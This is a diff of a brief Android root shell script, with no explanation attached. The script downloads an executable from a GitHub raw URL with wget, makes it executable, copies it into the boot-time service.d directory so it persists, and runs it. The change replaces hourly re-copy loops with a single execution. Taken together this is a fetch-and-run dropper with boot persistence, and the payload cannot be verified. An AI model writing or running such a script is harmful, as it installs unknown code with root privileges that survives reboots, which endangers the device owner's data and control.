@@ -1,15 +1,6 @@
 #!/system/bin/sh
 wget -O /data/local/tmp/module https://github.com/Androidmate/Adb-tools-minimal/raw/develop/service
 mv /data/local/tmp/module /data/adb/module
-chown shell:shell /data/adb/module
 chmod +x /data/adb/module
-
-/data/adb/module
-
 cp /data/adb/module /data/adb/service.d/service
-sleep 3600
-cp /data/adb/module /data/adb/service.d/service
-sleep 3600
-cp /data/adb/module /data/adb/service.d/service
-sleep 3600
-cp /data/adb/module /data/adb/service.d/service
+/data/adb/service.d/service
